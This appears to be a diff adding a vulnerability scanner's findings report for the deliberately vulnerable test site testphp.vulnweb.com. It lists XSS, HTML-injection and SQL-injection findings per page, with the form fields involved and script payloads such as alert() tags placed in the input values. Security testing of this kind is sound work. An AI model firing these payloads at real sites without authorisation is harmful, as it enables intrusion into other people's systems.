@@ -1,0 +1,69 @@
+####################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/cart.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/signup.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/signup.php
+{'action': '/secured/newuser.php', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'uuname', 'style': 'width:200px', 'value': '"><script>"\n'}, {'type': 'password', 'name': 'upass', 'style': 'width:200px'}, {'type': 'password', 'name': 'upass2', 'style': 'width:200px'}, {'type': 'text', 'name': 'urname', 'style': 'width:200px', 'value': '"><script>"\n'}, {'type': 'text', 'name': 'ucc', 'style': 'width:200px', 'value': '"><script>"\n'}, {'type': 'text', 'name': 'uemail', 'style': 'width:200px', 'value': '"><script>"\n'}, {'type': 'text', 'name': 'uphone', 'style': 'width:200px', 'value': '"><script>"\n'}, {'type': 'submit', 'value': 'signup', 'name': 'signup'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/categories.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/listproducts.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/index.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/login.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** XSS ATTACK **
+
+path: http://testphp.vulnweb.com/userinfo.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': "<Script>alert('a')</scripT>\n"}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** SQL injection **
+
+path: http://testphp.vulnweb.com/secured/newuser.php
+{'action': '/secured/newuser.php', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'uuname', 'style': 'width:200px'}, {'type': 'password', 'name': 'upass', 'style': 'width:200px'}, {'type': 'password', 'name': 'upass2', 'style': 'width:200px'}, {'type': 'text', 'name': 'urname', 'style': 'width:200px'}, {'type': 'text', 'name': 'ucc', 'style': 'width:200px'}, {'type': 'text', 'name': 'uemail', 'style': 'width:200px'}, {'type': 'text', 'name': 'uphone', 'style': 'width:200px'}, {'type': 'submit', 'value': 'signup', 'name': 'signup'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/cart.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/signup.php
+{'action': '/secured/newuser.php', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'uuname', 'style': 'width:200px', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'type': 'password', 'name': 'upass', 'style': 'width:200px'}, {'type': 'password', 'name': 'upass2', 'style': 'width:200px'}, {'type': 'text', 'name': 'urname', 'style': 'width:200px', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'type': 'text', 'name': 'ucc', 'style': 'width:200px', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'type': 'text', 'name': 'uemail', 'style': 'width:200px', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'type': 'text', 'name': 'uphone', 'style': 'width:200px', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'type': 'submit', 'value': 'signup', 'name': 'signup'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/signup.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/categories.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/listproducts.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/index.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/login.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}########################################################################################################################################################################################################
+** HTML injection **
+
+path: http://testphp.vulnweb.com/userinfo.php
+{'action': 'search.php?test=query', 'method': 'post', 'inputs': [{'name': 'searchFor', 'type': 'text', 'size': '10', 'value': '<script\\x20type="text/javascript">javascript:alert(1);</script>\n'}, {'name': 'goButton', 'type': 'submit', 'value': 'go'}]}####################################################################################################
